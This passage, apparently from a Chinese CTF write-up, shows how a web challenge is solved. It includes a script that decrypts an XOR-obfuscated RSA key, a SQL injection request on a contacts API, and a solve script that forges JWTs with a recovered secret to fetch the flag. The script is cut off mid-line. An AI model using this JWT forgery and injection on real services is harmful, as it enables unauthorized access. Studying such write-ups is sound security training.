class="string">&quot;&quot;&quot;|z&#125;w&#123;Xp|qVXE]Y[v\x0bD\x01qudwtps|rre\rs\x7fx&#123;qrT\x7fvscts\x05ykF\x04~a~J\x01@\n\x03YaD\x01B\x04K9\\DFUH\x1dyFDc[Fw\x06\x01guxsxaJ\x07h\x06]aGqGd[p[Dtd|\x02\x07\x01dXYG&#125;RPsAB~\x05K@F|ZFYtW|\x7f?A\x06~aG\x06cN&#125;dKV^XVDl\x02j\x02\x05Cukxzzkkua\x05d^\x1fRhP\x04jkFZe\ruQwCUtYV~P~[DVVfc@@8y\x06@G\x00&#123;Ea&#123;&#123;&#125;ZeX\\xhCrYU~gaM~t\x00\x19^Fup\x7fdF\x04q|`q\x1bS@tAA\x1cd\x06\x1fzAB[\x7ftpeSz`P_8\n\x08fAL\x0bykAt`Dl\x07W\x19\x7fDExr@y|Sf\x03_HPd\x05jf`[k_[Y\x1eY\x03\x1aU\x0b|tg\x05\x03fAgiEDAw@vdsD;x\x1b\\|PrubUxe\x02\x05x\x1eVv~\x00mrkzzww\x03d\x7fXsBuur\x01_zb]G\x06\x04\x0bu\x03PvzJ~EfdDs|cE\x1eqp\x00@&gt;aE&#123;usbpq&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🔍 开始解密RSA公钥...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;📝 加密字符串长度: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_key)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤1: 使用XOR解密</span></span><br><span class="line">    decrypted_key = decrypt_string(encrypted_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;✅ XOR解密完成，长度: <span class="subst">&#123;<span class="built_in">len</span>(decrypted_key)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;📄 解密结果预览: <span class="subst">&#123;decrypted_key[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 步骤2: Base64解码</span></span><br><span class="line">        public_key_der = base64.b64decode(decrypted_key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ Base64解码完成，二进制长度: <span class="subst">&#123;<span class="built_in">len</span>(public_key_der)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 步骤3: 解析DER格式的公钥</span></span><br><span class="line">        public_key = load_der_public_key(public_key_der)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;✅ RSA公钥解析成功！&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输出公钥信息</span></span><br><span class="line">        key_size = public_key.key_size</span><br><span class="line">        public_numbers = public_key.public_numbers()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n📊 RSA公钥信息:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🔑 密钥长度: <span class="subst">&#123;key_size&#125;</span> bits&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🔢 公钥指数 (e): <span class="subst">&#123;public_numbers.e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🔢 模数 (n): <span class="subst">&#123;<span class="built_in">hex</span>(public_numbers.n)[:<span class="number">50</span>]&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转换为PEM格式便于使用</span></span><br><span class="line">        pem_key = public_key.public_bytes(</span><br><span class="line">            encoding=serialization.Encoding.PEM,</span><br><span class="line">            <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n📋 PEM格式公钥:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(pem_key.decode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;key_object&quot;</span>: public_key,</span><br><span class="line">            <span class="string">&quot;pem&quot;</span>: pem_key.decode(),</span><br><span class="line">            <span class="string">&quot;der&quot;</span>: public_key_der,</span><br><span class="line">            <span class="string">&quot;key_size&quot;</span>: key_size,</span><br><span class="line">            <span class="string">&quot;exponent&quot;</span>: public_numbers.e,</span><br><span class="line">            <span class="string">&quot;modulus&quot;</span>: public_numbers.n</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 解析公钥失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🔍 解密后的字符串: <span class="subst">&#123;<span class="built_in">repr</span>(decrypted_key)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_rsa_encryption</span>(<span class="params">public_key_info</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试RSA加密功能&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> public_key_info:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line">        <span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 测试加密 &#123;&quot;action&quot;:&quot;getflag&quot;&#125;</span></span><br><span class="line">        message = <span class="string">&#x27;&#123;&quot;action&quot;:&quot;getflag&quot;&#125;&#x27;</span>.encode()</span><br><span class="line">        public_key = public_key_info[<span class="string">&quot;key_object&quot;</span>]</span><br><span class="line"></span><br><span class="line">        encrypted = public_key.encrypt(</span><br><span class="line">            message,</span><br><span class="line">            padding.PKCS1v15()</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        encrypted_b64 = base64.b64encode(encrypted).decode()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n🧪 RSA加密测试:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📝 原始消息: <span class="subst">&#123;message.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🔐 加密结果(Base64): <span class="subst">&#123;encrypted_b64[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📏 加密长度: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_b64)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> encrypted_b64</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ RSA加密测试失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🚀 RSA公钥提取工具&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取公钥</span></span><br><span class="line">    key_info = extract_rsa_public_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> key_info:</span><br><span class="line">        <span class="comment"># 测试加密</span></span><br><span class="line">        encrypted_msg = test_rsa_encryption(key_info)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n💡 使用建议:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1. 保存PEM格式的公钥到文件&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;2. 使用该公钥加密 &#x27;&#123;\&quot;action\&quot;:\&quot;getflag\&quot;&#125;&#x27; 消息&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;3. 将加密结果Base64编码后作为请求体发送&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n❌ 公钥提取失败，可能需要调整解密逻辑&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z</span><br><span class="line">hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK</span><br><span class="line">s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur</span><br><span class="line">H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn</span><br><span class="line">99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw</span><br><span class="line">K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s</span><br><span class="line">TwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f47ac10b-58cc-4372-a567-0e02b2c3d479</span><br><span class="line">c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b</span><br><span class="line">732390b8-ccb6-41de-a93b-94ea059fd263</span><br><span class="line">f633ec24-cfe6-42ba-bcd8-ad2dfae6d547</span><br><span class="line">eb8991c8-9b6f-4bc8-89dd-af3576e92bdb</span><br><span class="line">db62356d-3b99-4764-b378-e46cb95df9e6</span><br><span class="line">8f4610ee-ee87-4cca-ad92-6cac4fdbe722</span><br><span class="line">1678d80e-fd4d-4de3-aae2-cb0077f10c21</span><br></pre></td></tr></table></figure><p>经过长久测试发现sql注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/contacts?uid=&quot;!=&quot;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.96.162.115:8080</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoiOGY0NjEwZWUtZWU4Ny00Y2NhLWFkOTItNmNhYzRmZGJlNzIyIiwiaWF0IjoxNzQ5MzY0ODA4fQ.8hvBEM4jvKqlMXmVoYtechEGFid1a_S6otobnZ5sCvk</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/0penHarmonyCTF2025/QQ20250608-160919.jpg" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="comment"># 配置参数</span></span><br><span class="line">    SERVER_IP = <span class="string">&quot;web-722d04cf71.challenge.xctf.org.cn&quot;</span></span><br><span class="line">    TARGET_UID = <span class="string">&quot;9d5ec98c-5848-4450-9e58-9f97b6b3b7bc&quot;</span></span><br><span class="line">    SECRET = <span class="string">&quot;wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># RSA公钥</span></span><br><span class="line">    RSA_PUBLIC_KEY = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z</span></span><br><span class="line"><span class="string">hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK</span></span><br><span class="line"><span class="string">s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur</span></span><br><span class="line"><span class="string">H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn</span></span><br><span class="line"><span class="string">99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw</span></span><br><span class="line"><span class="string">K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s</span></span><br><span class="line"><span class="string">TwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🚀 开始获取Flag...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🎯 目标服务器: <span class="subst">&#123;SERVER_IP&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🔑 使用UUID: <span class="subst">&#123;TARGET_UID&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 加载RSA公钥</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        public_key = serialization.load_pem_public_key(RSA_PUBLIC_KEY.encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;✅ RSA公钥加载成功&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ RSA公钥加载失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 准备要加密的消息</span></span><br><span class="line">    message = <span class="string">&#x27;&#123;&quot;action&quot;:&quot;getflag&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;📝 准备加密消息: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. RSA加密消息</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        encrypted_data = public_key.encrypt(</span><br><span class="line">            message.encode(),</span><br><span class="line">            padding.PKCS1v15()</span><br><span class="line">        )</span><br><span class="line">        encrypted_b64 = base64.b64encode(encrypted_data).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🔐 RSA加密完成，Base64长度: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_b64)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ RSA加密失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 构造请求体</span></span><br><span class="line">    request_body = &#123;</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: encrypted_b64,</span><br><span class="line">    &#125;</span><br><span class="line">    request_json = json.dumps(request_body)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 生成MD5签名</span></span><br><span class="line">    md5_sign = hashlib.md5(request_json.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🔑 MD5签名: <span class="subst">&#123;md5_sign&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. 生成JWT token</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jwt_payload = &#123;</span><br><span class="line">            <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uid&quot;</span>: TARGET_UID,</span><br><span class="line">            <span class="string">&quot;iat&quot;</span>: <span class="built_in">int</span>(time.time())</span><br><span class="line">        &#125;</span><br><span class="line">        jwt_token = jwt.encode(jwt_payload, SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🎫 JWT Token生成成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📋 Payload: <span class="subst">&#123;jwt_payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ JWT生成失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 7. 先尝试获取联系人信息（可选，用于验证token）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n📞 尝试获取联系人信息...&quot;</span>)</span><br><span class="line">        contacts_url = <span class="string">f&quot;http://<span class="subst">&#123;SERVER_IP&#125;</span>/api/v1/contacts?uid=<span class="subst">&#123;TARGET_UID&#125;</span>&quot;</span></span><br><span class="line">        contacts_response = requests.get(contacts_url, headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: jwt_token,</span><br><span class="line">        &#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📊 联系人API响应状态: <span class="subst">&#123;contacts_response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> contacts_response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;📦 联系人数据: <span class="subst">&#123;contacts_response.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;⚠️  联系人API响应: <span class="subst">&#123;contacts_response.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;⚠️  获取联系人信息失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 8. 发送获取flag的请求</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: jwt_token,</span><br><span class="line">            <span class="string">&#x27;X-Sign&#x27;</span>: md5_sign,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Flag-Getter/1.0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        flag_url = <span class="string">f&#x27;http://<span class="subst">&#123;SERVER_IP&#125;</span>/api/v1/getflag&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n📡 发送Flag请求到: <span class="subst">&#123;flag_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📋 请求头: <span class="subst">&#123;headers&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📋 请求体: <span class="subst">&#123;request_json&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        response = requests.post(</span><br><span class="line">            flag_url,</span><br><span class="line">            headers=headers,</span><br><span class="line">            json=request_body,</span><br><span class="line">            timeout=<span class="number">15</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📊 响应状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📦 响应头: <span class="subst">&#123;<span class="built_in">dict</span>(response.headers)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;📦 响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = response.json()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;✅ JSON解析成功: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 检查各种可能的flag字段</span></span><br><span class="line">                flag = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    flag = result[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&#x27;data&#x27;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="built_in">isinstance</span>(result[<span class="string">&#x27;data&#x27;</span>], <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">                    flag = result[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&#x27;message&#x27;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(result[<span class="string">&#x27;message&#x27;</span>]).lower():</span><br><span class="line">                    flag = result[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n🎉 成功获取Flag!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;🏆 Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;⚠️  响应中未找到flag字段&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;⚠️  响应不是有效的JSON格式&quot;</span>)</span><br><span class="line">                <span class="comment"># 检查响应中是否直接包含flag</span></span><br><span class="line">                response_text = response.text.lower()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response_text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;🎉 在响应文本中发现flag: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> response.text</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 请求失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 错误信息: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span 